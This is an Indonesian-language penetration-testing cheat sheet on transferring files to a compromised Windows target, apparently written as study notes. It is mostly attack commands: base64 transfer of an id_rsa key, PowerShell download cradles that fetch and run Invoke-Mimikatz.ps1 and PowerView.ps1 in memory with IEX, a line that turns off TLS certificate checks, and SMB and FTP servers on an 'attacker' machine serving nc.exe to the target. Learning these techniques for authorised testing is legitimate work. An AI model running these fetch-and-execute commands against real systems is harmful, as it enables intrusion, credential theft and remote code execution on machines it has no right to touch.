# File Transfer

## Windows

#### Metode 1: copas dari Linux

```
# cek dulu hash-nya di linux
md5sum file

# konversi ke base64
cat file |base64 -w 0;echo

# di windows
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("ENCODED-BASE64"))

# pastikan hash-nya sama seperti di awal
Get-FileHash PATH-FILE -Algorithm md5
```

#### Metode 2: download file dari sumber online dengan PowerShell

```
# metode yg bisa digunakan
Method	            Description
OpenRead	    Returns the data from a resource as a Stream.
OpenReadAsync	    Returns the data from a resource without blocking the calling thread.
DownloadData	    Downloads data from a resource and returns a Byte array.
DownloadDataAsync   Downloads data from a resource and returns a Byte array without blocking the calling thread.
DownloadFile	    Downloads data from a resource to a local file.
DownloadFileAsync   Downloads data from a resource to a local file without blocking the calling thread.
DownloadString	    Downloads a String from a resource and returns a String.
DownloadStringAsync Downloads a String from a resource without blocking the calling thread.

# contoh dengan method DownloadFile
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

# dengan method DownloadString (fileless: langsung eksekusi tanpa simpan)
IEX (New-Object Net.WebClient).DownloadString('https://<url>/Invoke-Mimikatz.ps1')

# IEX bisa juga untuk pipeline
(New-Object Net.WebClient).DownloadString('URL-KE-FILE-PS1') | IEX

# menggunakan Invoke-WebRequest
Invoke-WebRequest https://<url>/PowerView.ps1 -OutFile PowerView.ps1

# mengatasi error jika konfigurasi internet explorer tidak di selesaikan
# bypass dengan -UseBasicParsing
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX

# mengatasi error terkait dengan sertifikat SSL/TLS not trusted
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

#### Metode 3: SMB download

```
# server SMB di komputer attacker
sudo impacket-smbserver share -smb2support /tmp/smbshare

# dari komp target
copy \\<ip>\share\nc.exe

# versi windows baru memblokir akses yang tidak terautentikasi
# server SMB di komputer attacker
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

# dari komp target
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

#### Metode 4: FTP download

```
# install server ftp di komp attacker
sudo pip3 install pyftpdlib

# jalankan di port 21 (user anonymous secara default aktif)
sudo python3 -m pyftpdlib --port 21

# download dari ftp dg powershell
(New-Object Net.WebClient).DownloadFile('ftp://<ip>/file.txt', 'C:\Users\Public\ftp-file.txt')


```
